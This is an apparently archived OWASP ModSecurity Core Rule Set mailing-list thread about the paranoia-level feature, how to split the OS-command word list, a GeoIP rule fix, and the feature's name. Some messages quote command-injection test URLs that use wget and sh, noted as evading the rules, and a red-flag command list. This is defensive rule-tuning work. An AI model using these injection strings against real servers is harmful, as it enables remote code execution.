So I think we have to decide later, outside of this little project,
and we should move on to the first pull request.

Regards,
Franziska

2016-02-15 5:07 GMT+01:00 Chaim Sanders <CSanders at trustwave.com>:
> For the record I think this is a good idea but perhaps outside the scope a
> bit of the initial RC release. Christian, I suggest we add this to the
> To-do for 3.1. Thoughts?
>
> On 2/12/16, 4:17 PM,
> "owasp-modsecurity-core-rule-set-bounces at lists.owasp.org on behalf of
> Christian Folini" <owasp-modsecurity-core-rule-set-bounces at lists.owasp.org
> on behalf of christian.folini at netnea.com> wrote:
>
>>Hi there,
>>
>>There has not been any additional feedback in this thread, but I think
>>the question is not settled as of this writing.
>>
>>Thoughts?
>>
>>Regs,
>>
>>Christian
>>
>>On Sun, Feb 07, 2016 at 08:55:30PM +0100, Christian Folini wrote:
>>> Hi there,
>>>
>>> On Sat, Feb 06, 2016 at 11:04:00PM +0100, Walter Hop wrote:
>>> > I like the idea of splitting the file.
>>>
>>> Cool.
>>>
>>> > I agree some of the words in os-commands.data seem rather paranoid.
>>>Words like "choice", "help", "now? seem of low value and are common in
>>>natural text. Also, the large number of Unix-only environments could
>>>skip Windows related commands. It?s hard for users to modify these lists
>>>as you?d have to hack the CRS, and these huge collections are to
>>>maintain anyhow, so I agree we need granularity.
>>>
>>> Good point.
>>>
>>> > The rule has some regexp magic to prevent false positives, but the
>>>balance is not a complete success in my opinion. For instance, the
>>>following URLs don't trigger in CRSv3:
>>> > http://vuln/?cmd=wget%20http://example.com/blah.txt
>>> > http://vuln/?cmd=sh%20blah.txt
>>> >
>>> > So it's not as strong as you would want either to prevent some common
>>>RCE.
>>> > Something like http://vuln/?cmd=Wget%20http://example.com/;%20ecHo
>>>does trigger it.
>>>
>>> I see. Good observations.
>>>
>>> > 1) I think that a user should check their desired platforms in the
>>>setup conf. In fact, this would be great to do anyway in the initial
>>>3.0.0 release even if we DON'T look at it in any rule yet. Specifying
>>>platform types will pave the way for reducing false positives and false
>>>negatives by skipping unnecessary checks and being more strict on the
>>>right platforms. So we could start by listing these platforms in the
>>>existing rule in the setup conf. Example:
>>> >
>>> >    SecAction \
>>> >      "id:'900024', \
>>> >      phase:1, \
>>> >      t:none, \
>>> >      setvar:tx.unix=1, \
>>> >      setvar:tx.windows=1, \
>>> >      setvar:tx.java=1, \
>>> >      setvar:tx.php=1, \
>>>
>>> That makes a lot of sense. At first sight.
>>>
>>> I think that a default install should come with these rulesets
>>> all enabled and a sysadmin can then switch them of if we is aware that
>>> there is no php in his service.
>>>
>>> So given the following two scenarios
>>> #1 - Newbie sysadmin installs ModSec and runs into a lot of false
>>>positives
>>>     because he does not disable unneeded rulesets
>>> #2 - Newbie sysadmin installs ModSec and is p0wned because he does not
>>>enable
>>>     the php protection
>>> I strongly favour #1.
>>>
>>> A vanilla install of the core rules should give you a full coverage for
>>>all
>>> types of services and a decent security level. Reducing false positives
>>>by
>>> omitting certain rules (ideally rules which provide no value for your
>>>setup)
>>> is the very idea of tuning.
>>> Reducing the initial number of false positives by moving certain rules
>>> with a worse relationsship between added security and false positives,
>>> that is the idea of the paranoia mode.
>>>
>>> Chaim stated in a different message, that the rules are now organised
>>> into files aimed at certain environments. So switching them off is
>>> fairly easy. And there are the tags on top of it.
>>> So you have tag:'language-PHP' and setting SecRuleRemoveByTag will
>>> disable them all very easily.
>>>
>>> So I think, we do not need these variables.
>>>
>>> > (By the way: I think it?s unfortunate that a user has to use value 1
>>>to enable a check. An undefined variable will mean that the CRS will
>>>skip some rules. This makes it dangerous to introduce a new variable in
>>>the CRS later; all existing installations MUST then add this variable to
>>>their setup rule immediately, or suffer from reduced security. It?s
>>>better to use a scheme that defaults to ?on?. A convention like
>>>?tx.disable_mysql=1? would be user unfriendly and error-prone. But we
>>>could check for an explicit ?off? string, e.g. ?setvar:tx.mysql=off?. If
>>>it?s not ?off? then assume that the user DOES want the check. I think
>>>it?s important to get this right in 3.0.0, it will be more painful to do
>>>it later.)
>>>
>>> That's a very good observation. I had a similar idea once.
>>>
>>> In programming, you usually start with a default value and then
>>> the users overrides the default value. If he wants to.
>>>
>>> I am not sure how modsecurity_crs_10_setup.conf.example is going to
>>> be transformed to work seamlessly with 3.0. But this makes the
>>> setting of default values a bit tricky.
>>>
>>> Maybe a file REQUEST-02-DEFAULTS.conf could set default values
>>> if certain variables are not set.
>>>
>>> > 2) Separate the words into multiple lists:
>>> >    os-commands-critical.data (absolute red flag list: "curl", "passwd",
>>>"sh", "uname", "wget" etc.)
>>> >    os-commands-paranoid.data (absolute low value, but high FP natural
>>>words like "choice")
>>> >    os-commands-windows.data (all Windows commands)
>>> >    os-commands-common.data (all other commands)
>>>
>>> Makes some sense. Too granular is difficult and you mix various
>>> grouping criteria (criticality, paranoia, os), which makes is a
>>> bit hard to follow.
>>>
>>> Other opinions?
>>>
>>> > 3) Review the current regexp against some test data and CRSv2 to make
>>>it more sensitive
>>>
>>> Good plan. Maybe this could be done in a separate pull request.
>>> I am afraid to overload the paranoia mode pull request...
>>>
>>> Ahoj,
>>>
>>> Christian
>>>
>>>
>>> --
>>> In war you will generally find that the enemy has at any time
>>> three courses of action open to him. Of those three, he will
>>> invariably choose the fourth.
>>> -- Helmuth Von Moltke
>>> _______________________________________________
>>> Owasp-modsecurity-core-rule-set mailing list
>>> Owasp-modsecurity-core-rule-set at lists.owasp.org
>>>
>>>http://scanmail.trustwave.com/?c=4062&d=ndG-1q_MaPpAIUX2lZSE6lY7cpl0meOIn
>>>uYrNabyug&s=5&u=https%3a%2f%2flists%2eowasp%2eorg%2fmailman%2flistinfo%2f
>>>owasp-modsecurity-core-rule-set
>>
>>--
>>mailto:christian.folini at netnea.com
>>http://scanmail.trustwave.com/?c=4062&d=ndG-1q_MaPpAIUX2lZSE6lY7cpl0meOInu
>>N-aaCptw&s=5&u=http%3a%2f%2fwww%2echristian-folini%2ech
>>twitter: @ChrFolini
>>_______________________________________________
>>Owasp-modsecurity-core-rule-set mailing list
>>Owasp-modsecurity-core-rule-set at lists.owasp.org
>>http://scanmail.trustwave.com/?c=4062&d=ndG-1q_MaPpAIUX2lZSE6lY7cpl0meOInu
>>YrNabyug&s=5&u=https%3a%2f%2flists%2eowasp%2eorg%2fmailman%2flistinfo%2fow
>>asp-modsecurity-core-rule-set
>
>
> ________________________________
>
> This transmission may contain information that is privileged, confidential, and/or exempt from disclosure under applicable law. If you are not the intended recipient, you are hereby notified that any disclosure, copying, distribution, or use of the information contained herein (including any reliance thereon) is strictly prohibited. If you received this transmission in error, please immediately contact the sender and destroy the material in its entirety, whether in electronic or hard copy format.
> _______________________________________________
> Owasp-modsecurity-core-rule-set mailing list
> Owasp-modsecurity-core-rule-set at lists.owasp.org
> https://lists.owasp.org/mailman/listinfo/owasp-modsecurity-core-rule-set

From christian.folini at netnea.com  Thu Feb 18 07:53:09 2016
From: christian.folini at netnea.com (Christian Folini)
Date: Thu, 18 Feb 2016 08:53:09 +0100
Subject: [Owasp-modsecurity-core-rule-set] Paranoia Mode:
	Forgotten	controversial candidate 900050 / 910100 (Client IP
	is from a	HIGH Risk Country Location)
In-Reply-To: <DM2PR0701MB129525A09BCCC5A3E22B5554DBAE0@DM2PR0701MB1295.namprd07.prod.outlook.com>
References: <DM2PR0701MB129525A09BCCC5A3E22B5554DBAE0@DM2PR0701MB1295.namprd07.prod.outlook.com>
Message-ID: <20160218075309.GA10110@elias>

Chaim,

It seems you have been the only one who wanted to keep the 
old country list active. Now Manuel and Franziska chimed
in and stated they would rather not continue with the
country list being active (or move it into paranoia) as
others have before.

For me, geoip-blocking is a separate decision on its own.
If somebody wants to activate that, it should be a
deliberate move, independent of the paranoia setting.
It could be linked with a paranoia level and enabled
as a side effect, but local sites in Romania would stop
functioning immediately and that is not our
intention with the paranoia mode.

Enabling paranoia and then remember to think about
activating / reconfiguring the country list in order to
activate geoip-blocking is also complicated.

So under the line, I think keeping the rule active
but with a default empty list of countries is the
best move in our situation.

I am going to do a separate pull request for this change.
That way it is completely independent of the paranoia
mode changes.

Ahoj,

Christian


-- 
In war you will generally find that the enemy has at any time 
three courses of action open to him. Of those three, he will 
invariably choose the fourth.
-- Helmuth Von Moltke

From christian.folini at netnea.com  Thu Feb 18 09:30:20 2016
From: christian.folini at netnea.com (Christian Folini)
Date: Thu, 18 Feb 2016 10:30:20 +0100
Subject: [Owasp-modsecurity-core-rule-set] Paranoia Mode: Forgotten
 controversial ...
In-Reply-To: <20160218075309.GA10110@elias>
References: <DM2PR0701MB129525A09BCCC5A3E22B5554DBAE0@DM2PR0701MB1295.namprd07.prod.outlook.com>
	<20160218075309.GA10110@elias>
Message-ID: <20160218093020.GA3449@elias>

-> https://github.com/SpiderLabs/owasp-modsecurity-crs/pull/284

I had to fix the GeoIP blocking rule as well.
It would use @pm with macro expansion of tx.high_risk_country_codes
but @pm does not perform macro expansion. Replaced with
@within and placed a note in the reference manual.

So it looks like people never complained about this rule because
it never blocked anything.

I also made sure that a GeoIPLookup is only performed on a
defined and non-empty tx.high_risk_country_codes.
I run this test with "!^$". It's the way the core rules
check for empty headers as well. However, I wonder if there
is not way to do this test without involving a (supposedly
costly) regex.

Feedback welcome.

Ahoj,

Christian


-- 
It is curious that physical courage should be so common in the world,
and moral courage so rare.
-- Mark Twain

From christian.folini at netnea.com  Thu Feb 18 09:49:29 2016
From: christian.folini at netnea.com (Christian Folini)
Date: Thu, 18 Feb 2016 10:49:29 +0100
Subject: [Owasp-modsecurity-core-rule-set] Paranoia Mode: Controversial
 candidate 950907 / 932100 (System command injection)
In-Reply-To: <CALrdzmKmL8Wa-PdnvdHP_oTE0xUmGPyf4Rxufi4yTa=sn6MMuQ@mail.gmail.com>
References: <20160202081718.GB29931@elias>
	<69CE0D94-2054-443C-8336-033DCCB33934@spam.lifeforms.nl>
	<20160207195530.GC30297@elias> <20160212211715.GB32631@elias>
	<D2E6B8F1.1A467%csanders@trustwave.com>
	<CALrdzmKmL8Wa-PdnvdHP_oTE0xUmGPyf4Rxufi4yTa=sn6MMuQ@mail.gmail.com>
Message-ID: <20160218094929.GA4093@elias>

Hello,

That is a smart move. It allows us to eliminate all "file splitting"
tasks out of the paranoia mode project. Simplifies things a lot.

@Chaim want to start a TODO file in the top folder of the CRS?

Ahoj,

Christian

On Wed, Feb 17, 2016 at 09:05:52PM +0100, Franziska Buehler wrote:
> Hi,
> 
> I also like the idea of splitting the file. Perhaps we even need multiple files.
> Walter has a lot of good thougts!
> This task doesn't seem to be very easy and some testing will be necessary.
> So I think we have to decide later, outside of this little project,
> and we should move on to the first pull request.
> 
> Regards,
> Franziska
> 
> 2016-02-15 5:07 GMT+01:00 Chaim Sanders <CSanders at trustwave.com>:
> > For the record I think this is a good idea but perhaps outside the scope a
> > bit of the initial RC release. Christian, I suggest we add this to the
> > To-do for 3.1. Thoughts?
> >
> > On 2/12/16, 4:17 PM,
> > "owasp-modsecurity-core-rule-set-bounces at lists.owasp.org on behalf of
> > Christian Folini" <owasp-modsecurity-core-rule-set-bounces at lists.owasp.org
> > on behalf of christian.folini at netnea.com> wrote:
> >
> >>Hi there,
> >>
> >>There has not been any additional feedback in this thread, but I think
> >>the question is not settled as of this writing.
> >>
> >>Thoughts?
> >>
> >>Regs,
> >>
> >>Christian
> >>
> >>On Sun, Feb 07, 2016 at 08:55:30PM +0100, Christian Folini wrote:
> >>> Hi there,
> >>>
> >>> On Sat, Feb 06, 2016 at 11:04:00PM +0100, Walter Hop wrote:
> >>> > I like the idea of splitting the file.
> >>>
> >>> Cool.
> >>>
> >>> > I agree some of the words in os-commands.data seem rather paranoid.
> >>>Words like "choice", "help", "now? seem of low value and are common in
> >>>natural text. Also, the large number of Unix-only environments could
> >>>skip Windows related commands. It?s hard for users to modify these lists
> >>>as you?d have to hack the CRS, and these huge collections are to
> >>>maintain anyhow, so I agree we need granularity.
> >>>
> >>> Good point.
> >>>
> >>> > The rule has some regexp magic to prevent false positives, but the
> >>>balance is not a complete success in my opinion. For instance, the
> >>>following URLs don't trigger in CRSv3:
> >>> > http://vuln/?cmd=wget%20http://example.com/blah.txt
> >>> > http://vuln/?cmd=sh%20blah.txt
> >>> >
> >>> > So it's not as strong as you would want either to prevent some common
> >>>RCE.
> >>> > Something like http://vuln/?cmd=Wget%20http://example.com/;%20ecHo
> >>>does trigger it.
> >>>
> >>> I see. Good observations.
> >>>
> >>> > 1) I think that a user should check their desired platforms in the
> >>>setup conf. In fact, this would be great to do anyway in the initial
> >>>3.0.0 release even if we DON'T look at it in any rule yet. Specifying
> >>>platform types will pave the way for reducing false positives and false
> >>>negatives by skipping unnecessary checks and being more strict on the
> >>>right platforms. So we could start by listing these platforms in the
> >>>existing rule in the setup conf. Example:
> >>> >
> >>> >    SecAction \
> >>> >      "id:'900024', \
> >>> >      phase:1, \
> >>> >      t:none, \
> >>> >      setvar:tx.unix=1, \
> >>> >      setvar:tx.windows=1, \
> >>> >      setvar:tx.java=1, \
> >>> >      setvar:tx.php=1, \
> >>>
> >>> That makes a lot of sense. At first sight.
> >>>
> >>> I think that a default install should come with these rulesets
> >>> all enabled and a sysadmin can then switch them of if we is aware that
> >>> there is no php in his service.
> >>>
> >>> So given the following two scenarios
> >>> #1 - Newbie sysadmin installs ModSec and runs into a lot of false
> >>>positives
> >>>     because he does not disable unneeded rulesets
> >>> #2 - Newbie sysadmin installs ModSec and is p0wned because he does not
> >>>enable
> >>>     the php protection
> >>> I strongly favour #1.
> >>>
> >>> A vanilla install of the core rules should give you a full coverage for
> >>>all
> >>> types of services and a decent security level. Reducing false positives
> >>>by
> >>> omitting certain rules (ideally rules which provide no value for your
> >>>setup)
> >>> is the very idea of tuning.
> >>> Reducing the initial number of false positives by moving certain rules
> >>> with a worse relationsship between added security and false positives,
> >>> that is the idea of the paranoia mode.
> >>>
> >>> Chaim stated in a different message, that the rules are now organised
> >>> into files aimed at certain environments. So switching them off is
> >>> fairly easy. And there are the tags on top of it.
> >>> So you have tag:'language-PHP' and setting SecRuleRemoveByTag will
> >>> disable them all very easily.
> >>>
> >>> So I think, we do not need these variables.
> >>>
> >>> > (By the way: I think it?s unfortunate that a user has to use value 1
> >>>to enable a check. An undefined variable will mean that the CRS will
> >>>skip some rules. This makes it dangerous to introduce a new variable in
> >>>the CRS later; all existing installations MUST then add this variable to
> >>>their setup rule immediately, or suffer from reduced security. It?s
> >>>better to use a scheme that defaults to ?on?. A convention like
> >>>?tx.disable_mysql=1? would be user unfriendly and error-prone. But we
> >>>could check for an explicit ?off? string, e.g. ?setvar:tx.mysql=off?. If
> >>>it?s not ?off? then assume that the user DOES want the check. I think
> >>>it?s important to get this right in 3.0.0, it will be more painful to do
> >>>it later.)
> >>>
> >>> That's a very good observation. I had a similar idea once.
> >>>
> >>> In programming, you usually start with a default value and then
> >>> the users overrides the default value. If he wants to.
> >>>
> >>> I am not sure how modsecurity_crs_10_setup.conf.example is going to
> >>> be transformed to work seamlessly with 3.0. But this makes the
> >>> setting of default values a bit tricky.
> >>>
> >>> Maybe a file REQUEST-02-DEFAULTS.conf could set default values
> >>> if certain variables are not set.
> >>>
> >>> > 2) Separate the words into multiple lists:
> >>> >    os-commands-critical.data (absolute red flag list: "curl", "passwd",
> >>>"sh", "uname", "wget" etc.)
> >>> >    os-commands-paranoid.data (absolute low value, but high FP natural
> >>>words like "choice")
> >>> >    os-commands-windows.data (all Windows commands)
> >>> >    os-commands-common.data (all other commands)
> >>>
> >>> Makes some sense. Too granular is difficult and you mix various
> >>> grouping criteria (criticality, paranoia, os), which makes is a
> >>> bit hard to follow.
> >>>
> >>> Other opinions?
> >>>
> >>> > 3) Review the current regexp against some test data and CRSv2 to make
> >>>it more sensitive
> >>>
> >>> Good plan. Maybe this could be done in a separate pull request.
> >>> I am afraid to overload the paranoia mode pull request...
> >>>
> >>> Ahoj,
> >>>
> >>> Christian
> >>>
> >>>
> >>> --
> >>> In war you will generally find that the enemy has at any time
> >>> three courses of action open to him. Of those three, he will
> >>> invariably choose the fourth.
> >>> -- Helmuth Von Moltke
> >>> _______________________________________________
> >>> Owasp-modsecurity-core-rule-set mailing list
> >>> Owasp-modsecurity-core-rule-set at lists.owasp.org
> >>>
> >>>http://scanmail.trustwave.com/?c=4062&d=ndG-1q_MaPpAIUX2lZSE6lY7cpl0meOIn
> >>>uYrNabyug&s=5&u=https%3a%2f%2flists%2eowasp%2eorg%2fmailman%2flistinfo%2f
> >>>owasp-modsecurity-core-rule-set
> >>
> >>--
> >>mailto:christian.folini at netnea.com
> >>http://scanmail.trustwave.com/?c=4062&d=ndG-1q_MaPpAIUX2lZSE6lY7cpl0meOInu
> >>N-aaCptw&s=5&u=http%3a%2f%2fwww%2echristian-folini%2ech
> >>twitter: @ChrFolini
> >>_______________________________________________
> >>Owasp-modsecurity-core-rule-set mailing list
> >>Owasp-modsecurity-core-rule-set at lists.owasp.org
> >>http://scanmail.trustwave.com/?c=4062&d=ndG-1q_MaPpAIUX2lZSE6lY7cpl0meOInu
> >>YrNabyug&s=5&u=https%3a%2f%2flists%2eowasp%2eorg%2fmailman%2flistinfo%2fow
> >>asp-modsecurity-core-rule-set
> >
> >
> > ________________________________
> >
> > This transmission may contain information that is privileged, confidential, and/or exempt from disclosure under applicable law. If you are not the intended recipient, you are hereby notified that any disclosure, copying, distribution, or use of the information contained herein (including any reliance thereon) is strictly prohibited. If you received this transmission in error, please immediately contact the sender and destroy the material in its entirety, whether in electronic or hard copy format.
> > _______________________________________________
> > Owasp-modsecurity-core-rule-set mailing list
> > Owasp-modsecurity-core-rule-set at lists.owasp.org
> > https://lists.owasp.org/mailman/listinfo/owasp-modsecurity-core-rule-set
> _______________________________________________
> Owasp-modsecurity-core-rule-set mailing list
> Owasp-modsecurity-core-rule-set at lists.owasp.org
> https://lists.owasp.org/mailman/listinfo/owasp-modsecurity-core-rule-set

-- 
mailto:christian.folini at netnea.com
http://www.christian-folini.ch
twitter: @ChrFolini

From Manuel.LeosRivas at gemalto.com  Thu Feb 18 09:56:31 2016
From: Manuel.LeosRivas at gemalto.com (Leos Rivas Manuel)
Date: Thu, 18 Feb 2016 09:56:31 +0000
Subject: [Owasp-modsecurity-core-rule-set] Paranoia Mode: Forgotten
 controversial ...
In-Reply-To: <20160218093020.GA3449@elias>
References: <DM2PR0701MB129525A09BCCC5A3E22B5554DBAE0@DM2PR0701MB1295.namprd07.prod.outlook.com>
	<20160218075309.GA10110@elias> <20160218093020.GA3449@elias>
Message-ID: <E2C9913D99137A42A2A9646B1E82B8DB010D44A9B5@A1GTOEMBXV001.gto.a3c.atos.net>

Maybe you can have a rule before this to check &variable eq 0 and skip the rule but the cost of macro expansion in your @within against that very simple regex should be very low, especially if you compare it to other rules with multiple capturing +100 long regex ;)

Regards,
Manuel

-----Original Message-----
From: owasp-modsecurity-core-rule-set-bounces at lists.owasp.org [mailto:owasp-modsecurity-core-rule-set-bounces at lists.owasp.org] On Behalf Of Christian Folini
Sent: jeudi 18 f?vrier 2016 10:30
To: owasp-modsecurity-core-rule-set at lists.owasp.org
Subject: Re: [Owasp-modsecurity-core-rule-set] Paranoia Mode: Forgotten controversial ...

-> https://github.com/SpiderLabs/owasp-modsecurity-crs/pull/284

I had to fix the GeoIP blocking rule as well.
It would use @pm with macro expansion of tx.high_risk_country_codes but @pm does not perform macro expansion. Replaced with @within and placed a note in the reference manual.

So it looks like people never complained about this rule because it never blocked anything.

I also made sure that a GeoIPLookup is only performed on a defined and non-empty tx.high_risk_country_codes.
I run this test with "!^$". It's the way the core rules check for empty headers as well. However, I wonder if there is not way to do this test without involving a (supposedly
costly) regex.

Feedback welcome.

Ahoj,

Christian


--
It is curious that physical courage should be so common in the world, and moral courage so rare.
-- Mark Twain
_______________________________________________
Owasp-modsecurity-core-rule-set mailing list Owasp-modsecurity-core-rule-set at lists.owasp.org
https://lists.owasp.org/mailman/listinfo/owasp-modsecurity-core-rule-set
________________________________
 This message and any attachments are intended solely for the addressees and may contain confidential information. Any unauthorized use or disclosure, either whole or partial, is prohibited.
E-mails are susceptible to alteration. Our company shall not be liable for the message if altered, changed or falsified. If you are not the intended recipient of this message, please delete it and notify the sender.
Although all reasonable efforts have been made to keep this transmission free from viruses, the sender will not be liable for damages caused by a transmitted virus.

From christian.folini at netnea.com  Thu Feb 18 10:03:05 2016
From: christian.folini at netnea.com (Christian Folini)
Date: Thu, 18 Feb 2016 11:03:05 +0100
Subject: [Owasp-modsecurity-core-rule-set] Paranoia Mode: Forgotten
 controversial ...
In-Reply-To: <E2C9913D99137A42A2A9646B1E82B8DB010D44A9B5@A1GTOEMBXV001.gto.a3c.atos.net>
References: <DM2PR0701MB129525A09BCCC5A3E22B5554DBAE0@DM2PR0701MB1295.namprd07.prod.outlook.com>
	<20160218075309.GA10110@elias> <20160218093020.GA3449@elias>
	<E2C9913D99137A42A2A9646B1E82B8DB010D44A9B5@A1GTOEMBXV001.gto.a3c.atos.net>
Message-ID: <20160218100305.GA4569@elias>

Manuel

On Thu, Feb 18, 2016 at 09:56:31AM +0000, Leos Rivas Manuel wrote:
> Maybe you can have a rule before this to check &variable eq 0 and skip the rule 

I guess so. But I wrote the default as empty variable and not
non-existing variable. So I thought I would skip the "&variable eq 0".

> but the cost of macro expansion in your @within against that very 
> simple regex should be very low, especially if you compare it to 
> other rules with multiple capturing +100 long regex ;)

Yes. Think so too. And maybe there is even special code in pcre to
reduce the costs of ^$.

Ahoj,

Christian


-- 
If you have men who will only come if they know there is a good road, 
I don't want them. I want men who will come if there is no road at all.
-- David Livingstone

From christian.folini at netnea.com  Thu Feb 18 12:13:01 2016
From: christian.folini at netnea.com (Christian Folini)
Date: Thu, 18 Feb 2016 13:13:01 +0100
Subject: [Owasp-modsecurity-core-rule-set] The paranoia mode naming question
Message-ID: <20160218121301.GA5039@elias>

Hello,

We have finished the list of rule candidates for our little
pet project. I have a working implementation under
https://github.com/dune73/owasp-modsecurity-crs/tree/paranoia-mode
and I think it is time to sort out the naming question
before submitting the first pull request with the basic mechanics.
(-> see https://www.owasp.org/index.php/OWASP_ModSec_CRS_Paranoia_Mode
for an explanation of the 4 pull requests planned)

I started out this project with the idea of an "on/off" setting.
Hence the idea of "mode". However, it became clear we are going
to work with a "level" ranging from 0-4 instead. So the idea of
"mode" no longer really applies. We need to find something better.

But of course, the core question is, if this should be called
paranoia, paranoid, strict or agressive or something else.

I opted for paranoia from the start and I still think it is the
right term. However, there has been opposition and we need to find
a solution everybody can agree with. I also think this is an
important discussion, as it is a non-technical discussion. So
everybody can chime in without being an expert and without running
lengthy tests in his lab.

Let me open the discussion with my reasoning why "paranoia" is the
right term. I will then continue to discuss the other options
and then you can respond and tell me why I am wrong and why the
other options are much better suited....

"Paranoia" is the new normal. The more the attacks evolve and the
more servers we configure, the more we realise, there is no real
security without being paranoid. So while paranoia used to be
a negative term, it is getting a more and more positive connotation;
especially in IT security.
Google the terms 
paranoid information security 
and you will get 2M hits. One of the top ones is
http://www.darkreading.com/operations/the-perfect-infosec-mindset-paranoia-+-skepticism/a/d-id/1297596
where the author says paranoia is the standard mindset now 
(hence paranoia mode) and that you need to pair this with
skepticism (in other words: the tuning of your ruleset).

Other hits include the following titles:
13 Security and Privacy Tips for the Truly Paranoid
Security for the Paranoid - SecurityFocus
I became paranoid with computer security issues, I always ...
The paranoid CISO | CSO Online
Computer-Security Paranoia
openssl - How paranoid should the average user be about ...

Looking through some of these hits, I get the felling that those
who really care about security acknowledge that they are paranoid
and that they think that is the right attitude.

I also remember reading about paranoid security settings 10-20 years ago
and I would skip them immediately. Now, when looking at a new software
or product, the term paranoia immediately catches my eye and I read
about the most paranoid options first and then decide if the product is
any good. Without paranoia options, I think it must be a happy sunshine
hippy thing.

Additionally, the term "PARANOID_MODE" is already there, even if it has
not been in wide use in the 2.2.X series of rules:

2.2.X> grep -r -i paranoi | wc -l
9

The Merriam-Wester dictionary has multiple definitions for paranoia.
One of them is:
"a tendency on the part of an individual or group toward excessive or
irrational suspiciousness and distrustfulness of others"

I think the adjectives "excessive", "irrational" "distrustful"
characterise our new functionality very well: When raising the level,
you are enabling additional rules, which will cause an excessive number
of false positives due to a general distrustful attitude towards user
submitted input.

Ideally, two years down the line, ModSecurity (Core Rules) discussion
will run like this:
"Man, I should install ModSecurity and the Core Rules on my server,
but I heard false positives are going to kill me."
"No worries, as long as you keep the paranoia setting low, false
positives are minimal."

Two weeks ago, the register ran a story about 
Rob Joyce, head of NSA's Tailored Access Operations:
http://www.theregister.co.uk/2016/01/28/nsas_top_hacking_boss_explains_how_to_protect_your_network_from_his_minions/
The article closed with the register quoting Joyce:
"At the end of the day it all boils down to knowing your network, 
he said, and it?s vital that IT administrators pick up their game 
and get paranoid about attacks."

Well said. And the core rules paranoia feature is going to help
with this in a controlled way without killing you with
false positives on the first day of the installation.

But let's look at the alternatives: "Strict" has been named as
a better term. I do not like strict. It implies that the standard
installation is not strict. Or that the default rules were not
strict. In fact they are very strict. Every single one of them.
It's just that they are more focused on less delicate aspects
of the requests. 

So I think the term does not work as it misleads the user into
making the wrong assumptions. You could say that running
the CRS in anomaly scoring mode and setting a threshold of >5
is un-strict. But the individual rules are all strict from my
point of view.

This is even more true, as we have Ryan Barnett's proposal to
use "aggressive". I think aggressive trumps strict as it 
sounds more like a gradual setting in my ears (both terms
exist in German as well, so maybe these are false friends
for me and their meaning is a wee bit different in English).

So this the new featureset would allow us to adjust how aggressive the
core rule set is. That does not sound too bad. It reminds me of a "teeth
metaphor" is use at times. A strong ruleset has strong teeth. By tuning
false positives, you pull a few of the teeth while keeping most of them
in place. The level of aggression adjusting with this new setting, would
thus add more teeth and the ruleset would thus become more aggressive. I
guess it's not overly wrong to think of piranhas in a pond.

The root of the term comes with the idea of active defense.
It lets me thing of a strike back. Look up the term
aggressive on The Merriam Webster dictionary. All the
definitions point in that direction:
http://www.merriam-webster.com/dictionary/aggressive
Aggressive always means that you not only defend, but you attack
as well.

(paranoia is entirely different in this regard. It does not
imply any counter strike)

So I think aggressive does not entirely meet the character of the new
functionality, which is in line with the rest of the core rules set in
being entirely defensive. It just block attacks. It absolutely does not
attempt to shut down the client, inject malware into the response or
launch a DoS attack against the source IP address (which would all be
possible with the right set of rules).

And what would be the complete term? Level of Aggression or 
Level of Aggressiveness, Aggressiveness Setting? That all springs
to mind. And that just does not sounds very cool in my ears.
Or outrightly negative ("Level of Aggression!").

So all in all, I think we should work with paranoia. It's the best
I can think of right now. And I thought about this a lot.

But now let me hear what you think about it!

Please do not take too long. My first pull request is almost
ready, so let's come to a resolution in the next few days.

Best regards,

Christian


-- 
Any technology that does not appear magical is insufficiently
advanced.        ?
-- Gregory Benford

From mail at noelzindel.org  Thu Feb 18 13:23:17 2016
From: mail at noelzindel.org (=?utf-8?Q?No=C3=ABl_Zindel?=)
Date: Thu, 18 Feb 2016 14:23:17 +0100
Subject: [Owasp-modsecurity-core-rule-set] The paranoia mode naming
	question
In-Reply-To: <20160218121301.GA5039@elias>
References: <20160218121301.GA5039@elias>
Message-ID: <91E281C0-EA66-4236-8A26-43DAD4808CFC@noelzindel.org>

Thanks Christian, for this statement. It?s encouraging to see how much effort you put into this.

In terms of seriousness I?d weight the three given expressions as such: paranoid > aggressive > strict. Besides the fact Christian pointed out - that aggressive implies an offensive action - I?d argue that paranoid is also the term that?d bother a user the most. Scanning through the patch-notes or going through the default configuration the term ?paranoia? would likely raise someones attention and therefore promote a throughout review of this particular mode. At least that?s what I?d do.

Cheers,
No?l


> On 18 Feb 2016, at 13:13, Christian Folini <christian.folini at netnea.com> wrote:
> 
> Hello,
> 
> We have finished the list of rule candidates for our little
> pet project. I have a working implementation under
> https://github.com/dune73/owasp-modsecurity-crs/tree/paranoia-mode
> and I think it is time to sort out the naming question
> before submitting the first pull request with the basic mechanics.
> (-> see https://www.owasp.org/index.php/OWASP_ModSec_CRS_Paranoia_Mode
> for an explanation of the 4 pull requests planned)
> 
> I started out this project with the idea of an "on/off" setting.
> Hence the idea of "mode". However, it became clear we are going
> to work with a "level" ranging from 0-4 instead. So the idea of
> "mode" no longer really applies. We need to find something better.
> 
> But of course, the core question is, if this should be called
> paranoia, paranoid, strict or agressive or something else.
> 
> I opted for paranoia from the start and I still think it is the
> right term. However, there has been opposition and we need to find
> a solution everybody can agree with. I also think this is an
> important discussion, as it is a non-technical discussion. So
> everybody can chime in without being an expert and without running
> lengthy tests in his lab.
> 
> Let me open the discussion with my reasoning why "paranoia" is the
> right term. I will then continue to discuss the other options
> and then you can respond and tell me why I am wrong and why the
> other options are much better suited....
> 
> "Paranoia" is the new normal. The more the attacks evolve and the
> more servers we configure, the more we realise, there is no real
> security without being paranoid. So while paranoia used to be
> a negative term, it is getting a more and more positive connotation;
> especially in IT security.
> Google the terms
> paranoid information security
> and you will get 2M hits. One of the top ones is
> http://www.darkreading.com/operations/the-perfect-infosec-mindset-paranoia-+-skepticism/a/d-id/1297596
> where the author says paranoia is the standard mindset now
> (hence paranoia mode) and that you need to pair this with
> skepticism (in other words: the tuning of your ruleset).
> 
> Other hits include the following titles:
> 13 Security and Privacy Tips for the Truly Paranoid
> Security for the Paranoid - SecurityFocus
> I became paranoid with computer security issues, I always ...
> The paranoid CISO | CSO Online
> Computer-Security Paranoia
> openssl - How paranoid should the average user be about ...
> 
> Looking through some of these hits, I get the felling that those
> who really care about security acknowledge that they are paranoid
> and that they think that is the right attitude.
> 
> I also remember reading about paranoid security settings 10-20 years ago
> and I would skip them immediately. Now, when looking at a new software
> or product, the term paranoia immediately catches my eye and I read
> about the most paranoid options first and then decide if the product is
> any good. Without paranoia options, I think it must be a happy sunshine
> hippy thing.
> 
> Additionally, the term "PARANOID_MODE" is already there, even if it has
> not been in wide use in the 2.2.X series of rules:
> 
> 2.2.X> grep -r -i paranoi | wc -l
> 9
> 
